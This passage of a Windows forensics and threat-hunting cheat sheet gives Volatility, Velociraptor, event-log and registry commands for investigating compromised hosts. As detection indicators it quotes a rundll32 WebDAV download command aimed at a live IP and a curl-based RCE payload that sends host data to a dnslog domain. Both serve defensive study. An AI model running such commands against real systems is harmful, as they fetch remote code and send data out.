#### via volatility2 / netstat

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem netstat
deactivate
```

#### via volatility3 / netscan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.netscan
deactivate
```

#### via volatility3 / netstat

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.netstat
deactivate
```

#### via volatility2 / connscan

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem connscan
deactivate
```

#### via volatility2 / sockscan

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem sockscan
deactivate
```

#### via volatility2 / sockets

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem sockets
deactivate
```

#### via volatility2 / connections

Windows XP/2003 specific

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem connections
deactivate
```

#### via ETW / Volatility3 / JPCERT's etw-scan / tracefmt

See [here](#via-etw--volatility3--jpcerts-etw-scan--tracefmt)


### Determine installed powershell version

#### via powershell / Get-Host

```
Get-Host | Select-Object Version
```

https://learn.microsoft.com/en-us/powershell/module/azuread/connect-azuread?view=azureadps-2.0

#### via registry key

```
reg query HKLM\Software\Microsoft\PowerShell\1\PowerShellEngine
reg query HKLM\Software\Microsoft\PowerShell\3\PowerShellEngine
```

### Listing files

#### via volatility3 / filescan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.filescan.FileScan
deactivate
```

#### via volatility3 / mftscan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.mftscan.MFTScan
deactivate
```

#### via volatility2 / filescan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem filescan
deactivate
```

#### via volatility2 / mftparser

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem mftparser
deactivate
```

### Look for Alternate Data Streams (ADS) files

#### via volatility3 / mftscan.ADS

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.mftscan.ADS
deactivate
```

#### via powershell

```
$FolderToCheck="C:\Users\manasbellani"; Get-ChildItem  -Recurse -Path $FolderToCheck | %{$ads = Get-Content $_.FullName -Stream Zone.Identifier -ErrorAction SilentlyContinue; if ($ads) { Write-Host "ADS for file " $_.FullName ": $ads"} }
```

#### via velociraptor / DetectRaptor / Windows.Detection.ZoneIdentifier

- Bulk Artifact search for suspicious indicators via velociraptor artifact: `DetectRaptor.Windows.Detection.ZoneIdentifier`


#### via Autopsy 

Filter for `.Zone.Identifer` files especially in Downloads folder in Autopsy

### Look for unusual AD Group creations

#### via Windows Event Logs / Event ID 4727, Event ID 4731

- Global groups are groups which are created in a domain but can be created in other domains within a forest, whereas local groups are groups which can be created within specific domain
  
```
EventID: 4727 (A security-enabled global group was created) OR EventID: 4731 (A security-enabled local group was created) OR EventID: 4735 (A security-enabled local group was changed)
Channel: Security
```

### Look for unusual memberships for AD Groups

Monitor for membership changes to these key groups: 
```
# Key AD Groups which can allow privilege escalation, Taken from: https://github.com/mthcht/awesome-lists/blob/main/Lists/permissions/AD/windows_sensitives_ad_groups_list.csv
ESX Admins
ESXi Admins
Account Operators
Administrators
Backup Operators
DnsAdmins
Admins DNS
Domain Admins
Enterprise Admins
Enterprise Key Admins
Group Policy Creator Owners
Hyper-V Administrators
Print Operators
Remote Management Users
Replicators
Schema Admins
Server Operators
Key Admins
Remote Desktop Users
```


#### via windows event logs / Event ID 4728 / EventID 4732

```
Channel = Security
EventID = 4728 (A member was added to a security-enabled global group) OR 4732 (A member was added to a security-enabled local group)
```

#### via net

```
# To list all the AD Groups
net localgroup

# To list all the members in an AD Group
net localgroup $AD_GROUP
```

#### via powershell / Get-ADGroupMember

```
Get-ADGroupMember -Identity $GROUP_NAME
```

### Look for unusual Command Lines

Look for:
```
# See https://www.huntress.com/blog/abusing-ngrok-hackers-at-the-end-of-the-tunnel > `What Is Conhost.exe?`
renamed processes masquerading as `conhost.exe` or `cmd.exe` but in reality are ngrok.exe

# Check for unusual chars for command line arguments eg. powershell can accept /command, -command, unicode - command, etc

# Check SHA256, SHA512 hashes for the processes / command lines that are executed to detect if binary files were renamed

# Look for execution of lolapps eg Greenshot, Dropbox, WinSCP
https://lolapps-project.github.io/lolapps

# Look for download attempts via webdav which can be done for malware. See https://dfir.ch/posts/today_i_learned_webdav_cache/#tfs_dav
rundll32.exe C:\Windows\system32\davclnt.dll,DavSetCookie 216.9.224.58@5555 http://216.9.224.58:5555/
```

#### via Windows Event Sysmon Logs / Event ID 4688, Event ID 1

See [here](#detect-for-unusual-processes-and-parent-processes-created)

#### via Microsoft Defender's KQL Advanced Threat Hunting / Sentinel

```
DeviceProcessEvents
| where DeviceName contains "testvm"
| project Timestamp, DeviceName, AccountDomain, AccountName, ProcessCommandLine,  InitiatingProcessCommandLine
| sort by Timestamp desc 
```

For info on `DeviceProcessEvents`, Refer [here](https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/deviceprocessevents)

#### via volatility2 / cmdscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f /root/RanDev.vmem cmdscan
deactivate
```

#### via volatility2 / cmdline

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f /root/RanDev.vmem cmdline
deactivate
```

#### via volatility2 / consoles

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=WinXPSP2x86 -f /root/RanDev.vmem consoles
deactivate
```

#### via volatility3 / cmdline

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.cmdline.CmdLine
deactivate
```

#### via registry / RunMRU

Captures command lines run via the `Run` dialog box in Windows

```
HKEY_USERS\$SID\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

#### via Anti-virus (AV) Log Files

Capture the command lines from the Anti-virus log files

```
# Symantec AV logs can show command lines as per https://x.com/malmoeb/status/1814392099376095523?s=46&t=WvGY79Umt5enRwgCbi4TQQ
C:\ProgramData\Symantec\Symantec Endpoint Protection\<version>\Data\Logs\AV\<number>.Log

# Folder can identify AV Security Events and times as per https://me.n-able.com/s/article/AV-Defender----Agent-Log-files-created-and-their-descriptions
C:\Program files(x86)\N-able Technologies\Windows Agent\Logs

# Windows Defender Log files can contain 'SDN:' which shows full file path and SHA2 hashes, 'DETECTION_ADD' can reveal the file paths which were identified as malware, ':EMS' can detect the process injections. Taken from: https://www.crowdstrike.com/blog/how-to-use-microsoft-protection-logging-for-forensic-investigations/
C:\ProgramData\Microsoft\Windows Defender\Support\MPLog-*
```

### Get Directory Table Base (DTB) for a kernel

DTB converts the physical address to virtual addresses

#### via volatility2 / kpcrscan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/TEST-WIN-INSTAN-20240315-062005.raw kpcrscan
deactivate
```

#### via volatility2 / imageinfo

See [here](#via-volatility2--imageinfo)

#### via volatility3 / windows.info.Info

See [here](#via-volatility3--windowsinfoinfo)

### Detect code injections / malware / hidden DLLs running in processes

#### via MemProcFS / Dokan

Follow steps [here](#via-memprocfs--dokan-1) to scan the memory sample, and then wait for `forensic\progress_percent.txt` file to be `100`.
Then, view the file under `forensic\findevil\findevil.txt` once progress is complete to identify malicious processes.

https://github.com/ufrisk/MemProcFS/wiki/FS_FindEvil

#### via volatility3 / malfind

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.malfind
deactivate
```

#### via volatility2 / yarascan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem yarascan -y $YARA_RULE_FILE
deactivate
```

#### via volatility3 / yarascan

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem yarascan.YaraScan --yara-file $YARA_RULE_FILE
deactivate
```

#### via volatility2 / psxview

See [here](#via-volatility2--psxview)

#### via sysmon logs / Process Create (Event ID 1)

Check the parent process in Sysmon Logs for suspicious Process Create (Event ID 1) events such as `cmd.exe`, `powershell.exe`, `nc.exe`, etc. and look at unusual parent process such as `word.exe`, `.jar` files, etc.

Check for `attrib` command with `+h` (attempt to hide file) being executed on files such as `.ps1` script. It can also be used to detect malware such as [Lifetime-ETW-Patch](https://github.com/EvilBytecode/Lifetime-Amsi-EtwPatch/blob/main/Patcher.go) which turns off AMSI and ETW.

Taken from [LetsDefend Log4J's RCE exercise](https://files-ld.s3.us-east-2.amazonaws.com/Alert-Reports/Log4j_RCE_Detected.pdf)

#### via chainsaw / sigma

Detects any unusual activity from loaded sigma rules. More examples available [here](https://github.com/WithSecureLabs/chainsaw?tab=readme-ov-file#command-examples-1)
```
C:\Users\Administrator\Desktop\opt\chainsaw\chainsaw\chainsaw.exe hunt C:\Windows\Temp\Logs -s C:\Users\Administrator\Desktop\opt\sigma\sigma-master -r C:\Users\Administrator\Desktop\opt\sigma\sigma-master\rules --mapping C:\Users\Administrator\Desktop\opt\chainsaw\chainsaw\mappings\sigma-event-logs-all.yml --csv --output C:\Windows\Temp\out.csv
```

#### via velocirpator / DetectRaptor / YaraProcessWin

Load the latest [DetectRaptor VQL](https://github.com/mgreen27/DetectRaptor/tree/master) Zip artifact into Velociraptor via Velociraptor > Artifact > Import Artifact > `DetectRaptor` AND then launch Velociraptor > Server > New Collection > Select `Server.Import.DetectRaptor`  and launch YaraProcessWin (`Windows.Detection.YaraProcessWin`) Artifact which will search for malware based on YaraForge.

Consider also looking for WebShellYara Artifact which will search for webshells based on YaraForge

### Identify unusual downloaded files

Certain actions such as LSA Dumping can also write files to this location

#### via Explorer

See following locations:
```
# Downloaded files
C:\Windows\Temp
C:\Users\$USER_ID\Desktop
C:\Users\$USER_ID\Downloads
C:\Users\$USER_ID\Documents
C:\Users\$USER_ID\AppData\Local\Temp

# Location where webdav downloaded files are located: https://dfir.ch/posts/today_i_learned_webdav_cache/
C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV\
```

#### via Sysmon Windows Event ID 11 / File Create Event

```
# 'TargetFileName' contains the path to the new file being written
Event ID = 11
Channel = Microsoft-Windows-Sysmon/Operational
Description = File Created
```

These could also be used to detect malware which may create powershell files such as .ps1 such as `Lifetime-ETW-Patch` which creates a file in Documents directory and makes it appear as though it is a System file in use. 

```
# 'TargetFileName' contains the path to the new file being written
Event ID = 11
Channel = Microsoft-Windows-Sysmon/Operational
Description = File Created
TargetFileName = C:\Users\*\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```


### Extract Files from image

#### via volatility3 / dumpfiles

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem dumpfiles --virtaddr 0xa001c401ed40
deactivate
```

#### via volatility2 / dumpfiles

```
# Use address from filescan to extract the address
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem dumpfiles --profile=Win10x64_19041 -Q 0x000000003f4bca20 -D ./dumpfiles -u
deactivate
```

### List kernel modules

#### via volatility3 / windows.modules

Command also dumps kernel modules for a process

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.modules.Modules
deactivate
```

#### via volatility3 / windows.modscan

Command also dumps kernel modules for a process

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.modscan
deactivate
```

#### via volatility2 / modscan

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem modscan
deactivate
```


### Dump processes

#### via volatility3 / dumpfiles

Command also dumps DLLs for a process
```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f ~/vulnhub/letsdefend/randev/RanDev.vmem windows.dumpfiles.DumpFiles --pid 8883
deactivate
```

#### via volatility2 / procdump

```
source /opt/volatility2/venv/bin/activate
mkdir ./dumpfiles
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem procdump --pid 7916 --dump-dir=$(pwd)/dumpfiles
deactivate
```

#### via volatility3 / pslist

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.pslist.PsList --dump --pid 7916
deactivate
```

### Get the DLLs for a process

#### via volatility2 / dlllist

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem dllist -p 7916
deactivate
```

#### via volatility3 / dlllist

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.dlllist.DllList --pid 7916
deactivate
```

### Get unusual File Handles opened by process

- Can be used to detect process attempts to read credentials from Lsass memory eg for golden ticket attack eg [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#golden-ticket-attack)

#### via Windows Event Logs / Event ID 4656

```
# Process Information.Process Name contains the name of the process which is reading the LSASS memory
# Access request information.Accesses contains privileged requests like 'Read from process memory'
Channel = Security
Object.Object Name = \Device\HarddiskVolume3\Windows\System32\lsass.exe
EventID = 4656 (A Handle to an object was requested)
```

#### via volatility2 / handles

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem handles --pid 7916
deactivate
```

#### via volatility3 / handles

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.handles.Handles --pid 7916
deactivate
```

### Build a timeline

*Key Artifacts* to focus on for a high-level idea:
- Command Executions / CommandLine (e.g. sysmon process create )
- Command Scripting Interpreter (e.g. powershell, bash)
- Scheduled Jobs (e.g. scheduled tasks)
- File Opened / Creations

#### via Get-MiniTimeline on mounted disk 

https://github.com/evild3ad/Get-MiniTimeline

#### via MemProcFS / Dokan

- Builds a timeline of all actions performed in `forensics` mode from memory image

```
# After executing these commands, Physical Memory will be available as file objects under This PC > Network Locations > M: 
cd C:\Users\azureuser\Desktop\opt\MemProcFS
MemProcFS.exe -forensic 1 -license-accept-elastic-license-2-0 -f $MEMORY_IMAGE
```

A list of available folders is available here: https://github.com/ufrisk/MemProcFS/wiki/FS_FindEvil

#### via volatility3 / timeliner.Timeliner

Runs all volatility3 modules to ensure that timeline is built

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem timeliner.Timeliner
deactivate
```

#### via plaso

Assuming `dd` / `E01` image has been taken and mounted on linux host with name `charlie-work-usb....`:

```
# Build an SQLITE timeline
docker run --rm -v /tmp:/data -v $(pwd):/in -it log2timeline/plaso log2timeline.py /in/charlie-work-usb-2009-12-11.e01  --storage_file /data/log2timeline.data
# Convert format to CSV
docker run --rm -v /tmp:/data -v $(pwd):/in -it log2timeline/plaso psort.py -w /data/log2timeline.csv /data/log2timeline.data
```
taken from [here](https://www.forensics-matters.com/2020/10/17/forensics-timeline-using-plaso-for-windows/)

#### via Autopsy

Use Tools > Timeline Analysis option to view the timeline. Additionally, it is possible to select `Linear` or `Logarithmic` scale to view the timeline. 
To see the details, switch from Mode `Counts` to `Details` in Autopsy.

A tutorial of using `Autopsy`'s timeline analysis is available [here](https://www.sleuthkit.org/autopsy/timeline.php)

#### via Eric Zimmerman's EvtxECmd

```
C:\Users\Administrator\Desktop\opt\EZTools\EvtxECmd\EvtxECmd.exe -d C:\Windows\System32\winevt\Logs --csv C:\Windows\Temp --csvf timeline.csv
```

#### via hayabusa

Hayabusa can also scan via sigma ruleset.

```
# Update sigma ruleset in hayabusa dir
cd C:\Users\Administrator\Desktop\opt\hayabusa
.\hayabusa-2.16.0-win-x64.exe update-rules
# Scan the log files and also build a timeline that can be opened in Timeline Explorer, Excel or Timesketch?
# Default folder for Windows Event logs: C:\Windows\System32\winevt\Logs
# Use `-U` for UTC time format and use `-f` for a single .evtx file when building a timeline
.\hayabusa-2.16.0-win-x64.exe csv-timeline -d C:\Windows\Temp\Logs -o C:\Windows\Temp\results.csv
.\hayabusa-2.16.0-win-x64.exe json-timeline -L -d C:\Windows\Temp\Logs -o C:\Windows\Temp\results.jsonl
```

#### via velociraptor / windows.eventlogs.hayabusa

Load artifact [Windows.EventLogs.Hayabusa](https://docs.velociraptor.app/exchange/artifacts/pages/windows.eventlogs.hayabusa/) to velociraptor as a zip file via Velociraptor > Artifact > Upload option.

Recommended by [Stephan Berger](https://manasmbellani2.atlassian.net/browse/SCRUM-467)

#### via Visual Studio Code 

- If `Visual Studio Code` is installed, path where list of all edited files via visual studio will be `C:\Users\*\AppData\Roaming\Code\User\History\`

https://x.com/malmoeb/status/1817953494252327095?s=46&t=WvGY79Umt5enRwgCbi4TQQ

### Dump process memory

#### via volatility2 / memdump

```
source /opt/volatility2/venv/bin/activate
mkdir ./dumpfiles
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem memdump --pid 7916 --dump-dir=$(pwd)/dumpfiles
deactivate
```

#### via volatility3 / memmap

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.memmap.Memmap --dump --pid 7916
deactivate
```

### Look for Recently Executed Applications

#### via volatility2 / userassist

Detects GUI Programs run on the System
```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem userassist
deactivate
```

#### via volatility3 / userassist

Detects GUI Programs run on the System

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.registry.userassist.UserAssist
deactivate
```

#### via amcache.hive / velociraptor / Windows.Detection.Amcache

```
Velocirpator > Hunt > Windows.Detection.Amcache
```

#### via amcache.hive / velociraptor / DetectRaptor / Windows.Detection.Amcache

```
Velocirpator > Hunt > DetectRaptor.Windows.Detection.Amcache
```

#### via amcache.hive / Eric Zimmerman's amcacheParser

```
"C:\Users\azureuser\Desktop\opt\EZTools\net6\AmcacheParser.exe" -f C:\Windows\appcompat\Programs\Amcache.hve --csv C:\Users\azureuser\Downloads
# View output with TimelineExplorer
C:\Users\azureuser\Desktop\opt\EZTools\net6\TimelineExplorer\TimelineExplorer.exe
```

#### via user assist / velociraptor / windows.registry.userassist

```
Velociraptor > Hunt > windows.registry.userassist
```
- Contains list of software links used to start programs
- Location of UserAssist key: `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\*\Count\*` which stores the program, number of times the binary executed
- Limitations: programs that were run using the command line can't be found in the User Assist keys
- Location of User Assist Registry:
```
NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\{GUID}\Count
```
- Tip: ensure that we check ALL paths for each {GUID} under count, please
```
NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
```
- A list of applications, files, links and other objects accessed.
```
NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
```

#### via user assist / Registry Explorer

```
cd C:\Users\azureuser\Desktop\opt\EZTools\net6\RegistryExplorer
RegistryExplorer.exe > Open the C:\Users\<Username>\NTUser.Dat file > Open the registry key path listed above
```

#### via prefetch / eric zimmerman's pecmd

```
cd C:\Users\azureuser\Desktop\opt\EZTools\net6
PECmd.exe -d C:\Users\azureuser\Desktop\opt\plaso\plaso-20240308\test_data --csv C:\Windows\Temp
```

#### via srum.db / eric zimmerman's srumecmd

- `System Resource Utilization Monitor`

- `SRUM.db` track the application usage, network utilization and System Energy State

```
cd C:\Users\azureuser\Desktop\opt\EZTools\net6

# Backup running software registry
reg save HKLM\SOFTWARE C:\Users\azureuser\Downloads\SOFTWARE

# SOFTWARE Hive: C:\Windows\System32\config\SOFTWARE, SOFTWARE Hive is optional
.\SrumECmd.exe -f C:\Windows\System32\sru\SRUDB.dat -r C:\Users\azureuser\Downloads\SOFTWARE --csv C:\Users\azureuser\Downloads
```

#### via srum.db / velociraptor / windows.forensics.srum

Velociraptor > Hunt > `Windows.Forensics.Srum`

#### via srum.db / srum_dmp

Tool at [github.com](https://github.com/MarkBaggett/srum-dump)

#### via shimcache / rawcopy / eric zimmerman's appcompatcacheparser

- *Note*: `Shimcache` captures the last time the binary was modified - not the last time it was executed
- Application Compatibility Cache
- Keeps track of application compatibility with the OS and tracks all applications launched on the machineRegistry is Located in `SYSTEM\CurrentControlSet\Control\SessionManager\Appcompatibility\AppcompatCache`

```
# Create a copy of the SYSTEM locked file via rawcopy if looking at live system

.\RawCopy64.exe /FileNamePath:C:\Windows\System32\config\SYSTEM /OutputPath:C:\Windows\Temp /OutputName:SYSTEM

# Run app compat cache parser (try without --nl first to not ignore dirty hives)
cd C:\Users\azureuser\Desktop\opt\EZTools\net6\
.\AppCompatCacheParser.exe -f C:\Windows\Temp\SYSTEM --csv C:\Windows\Temp --csvf C:\Windows\Temp\appcompatcacheparser.csv --nl
```

#### via shimcache / eric zimmerman's registry explorer, RECmd

```
# After launching registry explorer, open C:\Windows\system32\config\SYSTEM: HKLM\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache
cd C:\Users\azureuser\Desktop\opt\EZTools\net6\RegistryExplorer
RegistryExplorer.exe 
```

More info: https://www.linkedin.com/pulse/windows-incident-response-appcompatcache-taz-wake-gvnae/

#### via RDP Bitmap cache / bmc-tools 

- Typical location: ` C:\Users\<username>\AppData\Local\Microsoft\Terminal Server Client\Cache`
- Use BMC-Tools for creating screenshots / visualizations when RDP (`mstsc.exe` gets used)
```
cd "C:\Users\azureuser\Desktop\opt\bmc-tools\bmc-tools-master"
python .\bmc-tools.py -d "C:\Users\azureuser\Downloads"  -s "C:\Users\azureuser\AppData\Local\Microsoft\Terminal Server Client\Cache"
```

#### via RDP Bitmap cache / velociraptor / windows.forensics.rdpcache

```
velociraptor > hunt > windows.forensics.rdpcache
```

#### via Windows Registry / Background Activity Monitor (BAM) Artifact / Velociraptor / Windows.Forensics.BAM

```
velociraptor > hunt > Windows.Forensics.Bam
```


#### via Windows Registry / Eric Zimmerman's Tools

- Captures the application execution and the last execution time for each user's SID
  
```
C:\Users\azureuser\Desktop\opt\EZTools\net6\RegistryExplorer\RegistryExplorer.exe > Open `SYSTEM` registry
```

Registry Keys to monitor:
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\UserSettings\*
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\*
```

#### via Windows Defender Logs

```
# Check for 'BM Telemetry' OR '.exe' in logs at following locations e.g. MPLog-*.txt
# Taken from: https://www.thedfirspot.com/post/windows-defender-mp-logs-a-story-of-artifacts
C:\ProgramData\Microsoft\Windows Defender\Support\*.txt
```

### Check for installed applications 

Look for any applications running as servers and that could be exploited eg

```
# Indicative of cloudburst powershell-based malware as described here: https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/
C:\Program Files (x86)\Microsoft Intune Management Extension\Policies\Scripts

# Look for apps from Ruler Project which has a number of persistence based apps eg LogMeIn
https://ruler-project.github.io/ruler-project/RULER/remote/LogMeIn/
```

#### via wmic

```
wmic product get name, version
```

#### via Program Folders

Possible Locations:
- C:\Program Files
- C:\Program Files (x86)
- C:\Program data

#### via powershell

```
Get-WmiObject -Class Win32_Product
```

### Check various installed Application Logs

- Can provide indications of any exploits especially for running servers such as TightVNC, Mail servers, etc.
- Can also provide forensics artifacts eg SHA and file paths

#### via Program Files 

Common location for logs:

- Microsoft Windows Defender: See Windows Defender Logs [here](#via-windows-defender-logs). Can indicate SHA-1 hashes and the paths to the processes executed.

- ShareTool: `C:\PerfLogs\write-test.shareaudit`. Taken from [here](https://x.com/malmoeb/status/1825085850092220432)

- Minecraft: `C:\Users\LetsDefend\Desktop\Minecraft Server 1.12.2\logs`
  
- Fortinet EMS Logs: `C:\Program Files (x86)\Fortinet\FortiClientEMS\logs\`. Taken from [here](https://www.linkedin.com/posts/stephan-berger-59575a20a_my-team-colleague-asger-deleuran-s-investigated-activity-7217564988436033539-Sw0u?utm_source=share&utm_medium=member_ios)
  
- ServiceNow: `\\ServiceNow MID Server MID_Server_Prod\agent\logs\agent0.log.*`. Search for the following lines: `Dispatching event: 'MessageDispatchedEvent, message: Command <cmd>` which can show the commands being executed on servicenow especially due to remote code execution e.g. `curl hxxp://w2wlxu.dnslog.cn/?x=$(uname) -a|base64 -w0)`, as taken from [here](https://x.com/malmoeb/status/1814614969771544923)

#### via ProgramData

- Symantec Endpoint Protection: `C:\ProgramData\Symantec\Symantec Endpoint Protection\CurrentVersion\Data\Logs`: Leverage [SEParser](https://github.com/Beercow/SEPparser) to extract packets from Firewall Packet log, Parse ccSubSDK data into csv reports, Extract potential binary blobs from ccSubSDK, Parse VBN files into csv reports, etc.

- Intune Management Extension: `C:\ProgramData\Microsoft\IntuneManagementExtension\Logs\IntuneManagementExtension-YYYYMMDD-HHMMSS.log` can indicate powershell scripts being identified via Intune (sometimes malicious) as described by Mandiant [here](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/) > `Reaching for the Clouds: Intune with CLOUDBURST`

- For Wordpress, can extract the plugins and their versions incase they may have been exploited in the past: `Get-WordPressPlugin -PluginFolder "C:\capture\htdocs\wordpress\wp-content\plugins" | Format-Table -AutoSize` . More info: https://gist.github.com/darkoperator/606b68db569c2d030699e8548c119471

  
#### via dir / C: / System32 logs

```
# Look for .log file extension
dir /b /s C:\Windows\System32 | findstr /I "\.log"

# Look for .txt files which could be logs
dir /b /s C:\Windows\System32 | findstr /I "\.txt" | findstr /I log
```

### Look for unusual LNK files

#### via dir

```
cd C:
dir /b /s | findstr /I "*.lnk*"
```

#### via Eric Zimmerman's LECmd

```
# View CSV in Timeline explorer from Eric Zimmerman's
cd C:\Users\azureuser\Desktop\opt\EZTools\net6
LECmd.exe -d C:\Users\azureuser\Desktop --csv C:\Windows\Temp --mp
```

#### via velociraptor / Windows.Forensics.Lnk Artifact

```
C:\Users\azureuser\Desktop\opt\velociraptor\velociraptor.exe > Client Artifacts > Windows.Forensics.Lnk
```

### List recently accessed files or folders

#### via Notepad++ Artifacts

The following file contains the file being edited in a Notepad++ session (if a session was loaded when editing in notepad++). 


```
C:\Users\%USERNAME%\AppData\Roaming\Notepad++\session.xml
```

Backup files are also available under `backup` folder which are basically files that were edited within notepad++ for session

More Info: 
- https://ogmini.github.io/2025/02/09/Notepad++-Documenting-Digital-Artifacts-Part-2.html
- https://forensafe.com/blogs/windows_notepad++.html

### via Jump Lists / Eric Zimmerman's JLECmd

```
# View the results / CSV files via Timeline Explorer
C:\Users\azureuser\Desktop\opt\EZTools\net6
.\JLECmd.exe -d C:\Users\azureuser\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\ --mp --csv C:\Windows\Temp
.\JLECmd.exe -d C:\Users\azureuser\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\ --mp --csv C:\Windows\Temp
```

#### via Shellbags / Eric Zimmerman's SBEcmd

```
cd C:\Users\azureuser\Desktop\opt\EZTools\net6
# Specify Location of the NTUSER.dat files - typically, C:\Users\$USERNAME\NTUSER.dat
SBECmd.exe -d C:\Users\azureuser --csv C:\Windows\Temp
```

https://www.hackingarticles.in/forensic-investigation-shellbags/

#### via Shellbags / Eric Zimmerman's ShellBag Explorer

```
C:\Users\azureuser\Desktop\opt\EZTools\net6\ShellBagsExplorer\ShellBagsExplorer.exe
```
Then follow the guide in the link below to do the analysis: 
https://www.hackingarticles.in/forensic-investigation-shellbags/


### Analyse PageFile.sys, swapfile.sys files

- Note, one may require `Access FTK Imager` to view the pagefile or swapfile.sys files
  
#### via strings 

```
# Look for paths, environment variables, URLs, email addresses
strings pagefile.sys | grep -i "^[a-z]:\\\\" | sort | uniq | less
strings pagefile.sys | grep -i "^[a-zA-Z09_]*=.*" | sort -u | uniq | less
strings pagefile.sys | egrep "^https?://" | sort | uniq | less
strings pagefile.sys | egrep '([[:alnum:]_.-]{1,64}+@[[:alnum:]_.-]{2,255}+?\.[[:alpha:].]{2,4})' 
```

https://andreafortuna.org//2019/04/17/how-to-extract-forensic-artifacts-from-pagefile-sys/

### List Windows Registry Keys

#### via volatility2 / hivelist

```
source /opt/volatility2/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem hivelist
deactivate
```

#### via volatility3 / hivelist

```
source /opt/volatility3/venv/bin/activate
python3 /opt/volatility3/vol.py -f /root/RanDev.vmem windows.registry.hivelist.HiveList
deactivate
```

### Print specific registry key

#### via volatility2 / printkey

```
# Use offset from hive list to dump correct registry
source /opt/volatility3/venv/bin/activate
python2.7 /opt/volatility2/vol.py --profile=Win10x64_19041 -f /root/RanDev.vmem printkey -K "Software\Microsoft\Windows\CurrentVersion" -o 0xffffb50579465000 
deactivate
```

#### via volatility3 / printkey

